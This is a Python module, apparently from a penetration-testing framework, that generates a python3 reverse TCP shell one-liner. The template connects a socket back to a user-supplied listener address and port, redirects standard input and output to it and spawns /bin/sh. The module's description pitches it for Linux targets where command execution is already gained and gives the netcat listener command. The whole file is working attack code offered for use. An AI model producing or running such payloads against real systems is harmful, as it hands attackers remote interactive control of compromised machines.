"""Python reverse TCP shell one-liner generator."""

from core.module import PayloadModule
from core.options import OptAddress, OptPort

TEMPLATE = (
    "python3 -c 'import socket,os,pty;"
    "s=socket.socket();"
    "s.connect((\"{lhost}\",{lport}));"
    "[os.dup2(s.fileno(),fd) for fd in (0,1,2)];"
    "pty.spawn(\"/bin/sh\")'"
)


class PythonReverseTcp(PayloadModule):
    name = "Python Reverse TCP Shell"
    description = """
        Generates a python3 reverse-shell one-liner. Handy when you have
        command execution on a Linux target that has python3 but no
        `nc -e`. Catch it with: nc -lvnp <LPORT>
    """
    authors = ["you"]

    def register_options(self):
        self.options.add(OptAddress("LHOST", required=True,
                                    description="Your listener IP"))
        self.options.add(OptPort("LPORT", default=4444, description="Your listener port"))

    def generate(self):
        return TEMPLATE.format(
            lhost=self.get_option("LHOST"),
            lport=self.get_option("LPORT"),
        )
